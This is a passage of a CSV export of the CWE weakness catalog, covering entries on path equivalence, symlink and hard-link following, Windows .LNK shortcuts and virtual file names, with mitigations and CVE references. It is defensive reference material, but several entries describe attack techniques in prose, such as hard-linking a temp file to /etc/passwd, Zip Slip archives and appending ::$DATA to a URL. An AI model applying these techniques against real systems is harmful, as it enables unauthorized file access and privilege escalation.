checked.::\",\"::REFERENCE:CVE-2004-0696:DESCRIPTION:List directories using desired path and *:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0696::REFERENCE:CVE-2002-0433:DESCRIPTION:List files in web server using *.ext:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0433::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:filedir* (asterisk / wildcard)::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n57,\"Path Equivalence: 'fakedir/../realdir/filename'\",Variant,Incomplete,\"The product contains protection mechanisms to restrict access to 'realdir/filename', but it constructs pathnames using external input in the form of 'fakedir/../realdir/filename' that are not handled by those mechanisms. This allows attackers to perform unauthorized actions against the targeted file.\",\"\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2001-1152:DESCRIPTION:Proxy allows remote attackers to bypass denylist restrictions and connect to unauthorized web servers by modifying the requested URL, including (1) a // (double slash), (2) a /SUBDIR/.. where the desired file is in the parentdir, (3) a /./, or (4) URL-encoded characters.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1152::REFERENCE:CVE-2000-0191:DESCRIPTION:application check access for restricted URL before canonicalization:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0191::REFERENCE:CVE-2005-1366:DESCRIPTION:CGI source disclosure using dirname/../cgi-bin:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1366::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:dirname/fakechild/../realchild/filename::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"::TYPE:Theoretical:NOTE:This is a manipulation that uses an injection for one consequence (containment violation using relative path) to achieve a different consequence (equivalence by alternate name).::\",\n58,\"Path Equivalence: Windows 8.3 Filename\",Variant,Incomplete,\"The product contains a protection mechanism that restricts access to a long filename on a Windows operating system, but it does not properly restrict access to the equivalent short 8.3 filename.\",\"On later Windows operating systems, a file can have a long name and a short name that is compatible with older Windows file systems, with up to 8 characters in the filename and 3 characters for the extension. These 8.3 filenames, therefore, act as an alternate name for files with long names, so they are useful pathname equivalence manipulations.\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Windows:OPERATING SYSTEM PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:System Configuration:DESCRIPTION:Disable Windows from supporting 8.3 filenames by editing the Windows registry. Preventing 8.3 filenames will not remove previously generated 8.3 filenames.::\",\"::REFERENCE:CVE-1999-0012:DESCRIPTION:Multiple web servers allow restriction bypass using 8.3 names instead of long names:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0012::REFERENCE:CVE-2001-0795:DESCRIPTION:Source code disclosure using 8.3 file name.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0795::REFERENCE:CVE-2005-0471:DESCRIPTION:Multi-Factor Vulnerability. Product generates temporary filenames using long filenames, which become predictable in 8.3 format.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0471::\",::File Processing::,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Windows 8.3 Filename::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"::TYPE:Research Gap:NOTE:Probably under-studied.::\",\n59,\"Improper Link Resolution Before File Access ('Link Following')\",Base,Draft,\"The product attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource.\",\"\",::NATURE:ChildOf:CWE ID:706:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:706:VIEW ID:1003:ORDINAL:Primary::,\"::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Windows:OPERATING SYSTEM PREVALENCE:Sometimes::OPERATING SYSTEM CLASS:Unix:OPERATING SYSTEM PREVALENCE:Often::,\"::Soft links are a UNIX term that is synonymous with simple shortcuts on Windows-based platforms.::\",\"::TERM:insecure temporary file:DESCRIPTION:Some people use the phrase insecure temporary file when referring to a link following weakness, but other weaknesses can produce insecure temporary files without any symlink involvement at all.::TERM:Zip Slip:DESCRIPTION:Zip slip is an attack that uses file archives (e.g., ZIP, tar, rar, etc.) that contain filenames with path traversal sequences that cause the files to be written outside of the directory under which the archive is expected to be extracted [REF-1282]. It is most commonly used for relative path traversal (CWE-23) and link following (CWE-59).::\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories:IMPACT:Bypass Protection Mechanism:NOTE:An attacker may be able to traverse the file system to unintended locations and read or overwrite the contents of unexpected files. If the files are used for a security mechanism then an attacker may be able to bypass the mechanism.::SCOPE:Other:IMPACT:Execute Unauthorized Code or Commands:NOTE:Windows simple shortcuts, sometimes referred to as soft links, can be exploited remotely since a .LNK file can be uploaded like a normal file. This can enable remote execution.::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Follow the principle of least privilege when assigning access rights to entities in a software system. Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.::\",\"::REFERENCE:CVE-1999-1386:DESCRIPTION:Some versions of Perl follow symbolic links when running with the -e option, which allows local users to overwrite arbitrary files via a symlink attack.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1386::REFERENCE:CVE-2000-1178:DESCRIPTION:Text editor follows symbolic links when creating a rescue copy during an abnormal exit, which allows local users to overwrite the files of other users.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1178::REFERENCE:CVE-2004-0217:DESCRIPTION:Antivirus update allows local users to create or append to arbitrary files via a symlink attack on a logfile.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0217::REFERENCE:CVE-2003-0517:DESCRIPTION:Symlink attack allows local users to overwrite files.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0517::REFERENCE:CVE-2004-0689:DESCRIPTION:Window manager does not properly handle when certain symbolic links point to stale locations, which could allow local users to create or truncate arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0689::REFERENCE:CVE-2005-1879:DESCRIPTION:Second-order symlink vulnerabilities:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1879::REFERENCE:CVE-2005-1880:DESCRIPTION:Second-order symlink vulnerabilities:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1880::REFERENCE:CVE-2005-1916:DESCRIPTION:Symlink in Python program:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1916::REFERENCE:CVE-2000-0972:DESCRIPTION:Setuid product allows file reading by replacing a file being edited with a symlink to the targeted file, leaking the result in error messages when parsing fails.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0972::REFERENCE:CVE-2005-0824:DESCRIPTION:Signal causes a dump that follows symlinks.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0824::REFERENCE:CVE-2001-1494:DESCRIPTION:Hard link attack, file overwrite; interesting because program checks against soft links:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1494::REFERENCE:CVE-2002-0793:DESCRIPTION:Hard link and possibly symbolic link following vulnerabilities in embedded operating system allow local users to overwrite arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0793::REFERENCE:CVE-2003-0578:DESCRIPTION:Server creates hard links and unlinks files as root, which allows local users to gain privileges by deleting and overwriting arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0578::REFERENCE:CVE-1999-0783:DESCRIPTION:Operating system allows local users to conduct a denial of service by creating a hard link from a device special file to a file on an NFS file system.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0783::REFERENCE:CVE-2004-1603:DESCRIPTION:Web hosting manager follows hard links, which allows local users to read or modify arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1603::REFERENCE:CVE-2004-1901:DESCRIPTION:Package listing system allows local users to overwrite arbitrary files via a hard link attack on the lockfiles.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1901::REFERENCE:CVE-2005-1111:DESCRIPTION:Hard link race condition:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1111::REFERENCE:CVE-2000-0342:DESCRIPTION:Mail client allows remote attackers to bypass the user warning for executable attachments such as .exe, .com, and .bat by using a .lnk file that refers to the attachment, aka Stealth Attachment.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0342::REFERENCE:CVE-2001-1042:DESCRIPTION:FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1042::REFERENCE:CVE-2001-1043:DESCRIPTION:FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1043::REFERENCE:CVE-2005-0587:DESCRIPTION:Browser allows remote malicious web sites to overwrite arbitrary files by tricking the user into downloading a .LNK (link) file twice, which overwrites the file that was referenced in the first .LNK file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0587::REFERENCE:CVE-2001-1386:DESCRIPTION:.LNK. - .LNK with trailing dot:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1386::REFERENCE:CVE-2003-1233:DESCRIPTION:Rootkits can bypass file access restrictions to Windows kernel directories using NtCreateSymbolicLinkObject function to create symbolic link:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1233::REFERENCE:CVE-2002-0725:DESCRIPTION:File system allows local attackers to hide file usage activities via a hard link to the target file, which causes the link to be recorded in the audit trail instead of the target file.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0725::REFERENCE:CVE-2003-0844:DESCRIPTION:Web server plugin allows local users to overwrite arbitrary files via a symlink attack on predictable temporary filenames.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0844::REFERENCE:CVE-2015-3629:DESCRIPTION:A Libcontainer used in Docker Engine allows local users to escape containerization and write to an arbitrary file on the host system via a symlink attack in an image when respawning a container.:LINK:https://www.cve.org/CVERecord?id=CVE-2015-3629::REFERENCE:CVE-2021-21272:DESCRIPTION:Zip Slip vulnerability in Go-based Open Container Initiative (OCI) registries product allows writing arbitrary files outside intended directory via symbolic links or hard links in a gzipped tarball.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-21272::REFERENCE:CVE-2020-27833:DESCRIPTION:Zip Slip vulnerability in container management product allows writing arbitrary files outside intended directory via a container image (.tar format) with filenames that are symbolic links that point to other files within the same tar file; however, the files being pointed to can also be symbolic links to destinations outside the intended directory, bypassing the initial check.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-27833::\",::File Processing::,::File or Directory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Link Following::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO02-C:ENTRY NAME:Canonicalize path names originating from untrusted sources::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:POS01-C:ENTRY NAME:Check for the existence of links when dealing with files::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:FIO01-PL:ENTRY NAME:Do not operate on files that can be modified by untrusted users:MAPPING FIT:CWE More Specific::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP18:ENTRY NAME:Link in resource name resolution::\",::132::17::35::76::,\"::TYPE:Theoretical:NOTE:Link following vulnerabilities are Multi-factor Vulnerabilities (MFV). They are the combination of multiple elements: file or directory permissions, filename predictability, race conditions, and in some cases, a design limitation in which there is no mechanism for performing atomic file creation operations. Some potential factors are race conditions, permissions, and predictability.::\",\n61,\"UNIX Symbolic Link (Symlink) Following\",Compound,Incomplete,\"The product, when opening a file or directory, does not sufficiently account for when the file is a symbolic link that resolves to a target outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.\",\"A product that allows UNIX symbolic links (symlink) as part of paths whether in internal code or through user input can allow an attacker to spoof the symbolic link and traverse the file system to unintended locations or access arbitrary files. The symbolic link can permit an attacker to read/write/corrupt a file that they originally did not have permissions to access.\",::NATURE:ChildOf:CWE ID:59:VIEW ID:1000:ORDINAL:Primary::NATURE:Requires:CWE ID:362:VIEW ID:1000::NATURE:Requires:CWE ID:340:VIEW ID:1000::NATURE:Requires:CWE ID:386:VIEW ID:1000::NATURE:Requires:CWE ID:732:VIEW ID:1000::,\"::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Symlink following::TERM:symlink vulnerability::\",\"::PHASE:Implementation:NOTE:These are typically reported for temporary files or privileged programs.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Symbolic link attacks often occur when a program creates a tmp directory that stores files/links. Access to the directory should be restricted to the program as to prevent attackers from manipulating the files.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Follow the principle of least privilege when assigning access rights to entities in a software system. Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.::\",\"::REFERENCE:CVE-1999-1386:DESCRIPTION:Some versions of Perl follow symbolic links when running with the -e option, which allows local users to overwrite arbitrary files via a symlink attack.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1386::REFERENCE:CVE-2000-1178:DESCRIPTION:Text editor follows symbolic links when creating a rescue copy during an abnormal exit, which allows local users to overwrite the files of other users.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1178::REFERENCE:CVE-2004-0217:DESCRIPTION:Antivirus update allows local users to create or append to arbitrary files via a symlink attack on a logfile.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0217::REFERENCE:CVE-2003-0517:DESCRIPTION:Symlink attack allows local users to overwrite files.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0517::REFERENCE:CVE-2004-0689:DESCRIPTION:Possible interesting example:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0689::REFERENCE:CVE-2005-1879:DESCRIPTION:Second-order symlink vulnerabilities:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1879::REFERENCE:CVE-2005-1880:DESCRIPTION:Second-order symlink vulnerabilities:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1880::REFERENCE:CVE-2005-1916:DESCRIPTION:Symlink in Python program:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1916::REFERENCE:CVE-2000-0972:DESCRIPTION:Setuid product allows file reading by replacing a file being edited with a symlink to the targeted file, leaking the result in error messages when parsing fails.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0972::REFERENCE:CVE-2005-0824:DESCRIPTION:Signal causes a dump that follows symlinks.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0824::REFERENCE:CVE-2015-3629:DESCRIPTION:A Libcontainer used in Docker Engine allows local users to escape containerization and write to an arbitrary file on the host system via a symlink attack in an image when respawning a container.:LINK:https://www.cve.org/CVERecord?id=CVE-2015-3629::REFERENCE:CVE-2020-26277:DESCRIPTION:In a MySQL database deployment tool, users may craft a maliciously packaged tarball that contains symlinks to files external to the target and once unpacked, will execute.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-26277::REFERENCE:CVE-2021-21272:DESCRIPTION:Zip Slip vulnerability in Go-based Open Container Initiative (OCI) registries product allows writing arbitrary files outside intended directory via symbolic links or hard links in a gzipped tarball.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-21272::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:UNIX symbolic link following::\",::27::,\"::TYPE:Research Gap:NOTE:Symlink vulnerabilities are regularly found in C and shell programs, but all programming languages can have this problem. Even shell programs are probably under-reported. Second-order symlink vulnerabilities may exist in programs that invoke other programs that follow symlinks. They are rarely reported but are likely to be fairly common when process invocation is used [REF-493].::\",\n62,\"UNIX Hard Link\",Variant,Incomplete,\"The product, when opening a file or directory, does not sufficiently account for when the name is associated with a hard link to a target that is outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.\",\"Failure for a system to check for hard links can result in vulnerability to different types of attacks. For example, an attacker can escalate their privileges if a file used by a privileged program is replaced with a hard link to a sensitive file (e.g. /etc/passwd). When the process opens the file, the attacker can assume the privileges of that process.\",::NATURE:ChildOf:CWE ID:59:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Unix:OPERATING SYSTEM PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Follow the principle of least privilege when assigning access rights to entities in a software system. Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.::\",\"::REFERENCE:CVE-2001-1494:DESCRIPTION:Hard link attack, file overwrite; interesting because program checks against soft links:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1494::REFERENCE:CVE-2002-0793:DESCRIPTION:Hard link and possibly symbolic link following vulnerabilities in embedded operating system allow local users to overwrite arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0793::REFERENCE:CVE-2003-0578:DESCRIPTION:Server creates hard links and unlinks files as root, which allows local users to gain privileges by deleting and overwriting arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0578::REFERENCE:CVE-1999-0783:DESCRIPTION:Operating system allows local users to conduct a denial of service by creating a hard link from a device special file to a file on an NFS file system.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0783::REFERENCE:CVE-2004-1603:DESCRIPTION:Web hosting manager follows hard links, which allows local users to read or modify arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1603::REFERENCE:CVE-2004-1901:DESCRIPTION:Package listing system allows local users to overwrite arbitrary files via a hard link attack on the lockfiles.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1901::REFERENCE:CVE-2005-0342:DESCRIPTION:The Finder in Mac OS X and earlier allows local users to overwrite arbitrary files and gain privileges by creating a hard link from the .DS_Store file to an arbitrary file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0342::REFERENCE:CVE-2005-1111:DESCRIPTION:Hard link race condition:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1111::REFERENCE:CVE-2021-21272:DESCRIPTION:Zip Slip vulnerability in Go-based Open Container Initiative (OCI) registries product allows writing arbitrary files outside intended directory via symbolic links or hard links in a gzipped tarball.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-21272::REFERENCE:CVE-2003-1366:DESCRIPTION:setuid root tool allows attackers to read secret data by replacing a temp file with a hard link to a sensitive file:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1366::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:UNIX hard link::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO05-C:ENTRY NAME:Identify files using multiple file attributes::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP18:ENTRY NAME:Link in resource name resolution::\",,\"\",\n64,\"Windows Shortcut Following (.LNK)\",Variant,Incomplete,\"The product, when opening a file or directory, does not sufficiently handle when the file is a Windows shortcut (.LNK) whose target is outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.\",\"The shortcut (file with the .lnk extension) can permit an attacker to read/write a file that they originally did not have permissions to access.\",::NATURE:ChildOf:CWE ID:59:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Windows:OPERATING SYSTEM PREVALENCE:Undetermined::,\"\",\"::TERM:Windows symbolic link following::TERM:symlink::\",\"::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Follow the principle of least privilege when assigning access rights to entities in a software system. Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.::\",\"::REFERENCE:CVE-2019-19793:DESCRIPTION:network access control service executes program with high privileges and allows symlink to invoke another executable or perform DLL injection.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-19793::REFERENCE:CVE-2000-0342:DESCRIPTION:Mail client allows remote attackers to bypass the user warning for executable attachments such as .exe, .com, and .bat by using a .lnk file that refers to the attachment, aka Stealth Attachment.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0342::REFERENCE:CVE-2001-1042:DESCRIPTION:FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1042::REFERENCE:CVE-2001-1043:DESCRIPTION:FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1043::REFERENCE:CVE-2005-0587:DESCRIPTION:Browser allows remote malicious web sites to overwrite arbitrary files by tricking the user into downloading a .LNK (link) file twice, which overwrites the file that was referenced in the first .LNK file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0587::REFERENCE:CVE-2001-1386:DESCRIPTION:.LNK. - .LNK with trailing dot:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1386::REFERENCE:CVE-2003-1233:DESCRIPTION:Rootkits can bypass file access restrictions to Windows kernel directories using NtCreateSymbolicLinkObject function to create symbolic link:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1233::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Windows Shortcut Following (.LNK)::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO05-C:ENTRY NAME:Identify files using multiple file attributes::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP18:ENTRY NAME:Link in resource name resolution::\",,\"::TYPE:Research Gap:NOTE:Under-studied. Windows .LNK files are more portable than Unix symlinks and have been used in remote exploits. Some Windows API's will access LNK's as if they are regular files, so one would expect that they would be reported more frequently.::\",\n65,\"Windows Hard Link\",Variant,Incomplete,\"The product, when opening a file or directory, does not sufficiently handle when the name is associated with a hard link to a target that is outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.\",\"Failure for a system to check for hard links can result in vulnerability to different types of attacks. For example, an attacker can escalate their privileges if a file used by a privileged program is replaced with a hard link to a sensitive file (e.g. AUTOEXEC.BAT). When the process opens the file, the attacker can assume the privileges of that process, or prevent the program from accurately processing data.\",::NATURE:ChildOf:CWE ID:59:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Windows:OPERATING SYSTEM PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Follow the principle of least privilege when assigning access rights to entities in a software system. Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.::\",\"::REFERENCE:CVE-2002-0725:DESCRIPTION:File system allows local attackers to hide file usage activities via a hard link to the target file, which causes the link to be recorded in the audit trail instead of the target file.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0725::REFERENCE:CVE-2003-0844:DESCRIPTION:Web server plugin allows local users to overwrite arbitrary files via a symlink attack on predictable temporary filenames.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0844::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Windows hard link::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO05-C:ENTRY NAME:Identify files using multiple file attributes::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP18:ENTRY NAME:Link in resource name resolution::\",,\"\",\n66,\"Improper Handling of File Names that Identify Virtual Resources\",Base,Draft,\"The product does not handle or incorrectly handles a file name that identifies a virtual resource that is not directly specified within the directory that is associated with the file name, causing the product to perform file-based operations on a resource that is not a file.\",\"Virtual file names are represented like normal file names, but they are effectively aliases for other resources that do not behave like normal files. Depending on their functionality, they could be alternate entities. They are not necessarily listed in directories.\",::NATURE:ChildOf:CWE ID:706:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Other:IMPACT:Other::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-1999-0278:DESCRIPTION:In IIS, remote attackers can obtain source code for ASP files by appending ::$DATA to the URL.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0278::REFERENCE:CVE-2004-1084:DESCRIPTION:Server allows remote attackers to read files and resource fork content via HTTP requests to certain special file names related to multiple data streams in HFS+.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1084::REFERENCE:CVE-2002-0106:DESCRIPTION:Server allows remote attackers to cause a denial of service via a series of requests to .JSP files that contain an MS-DOS device name.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0106::\",::File Processing::,::File or Directory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Virtual Files::\",,\"\",\n67,\"Improper Handling of Windows 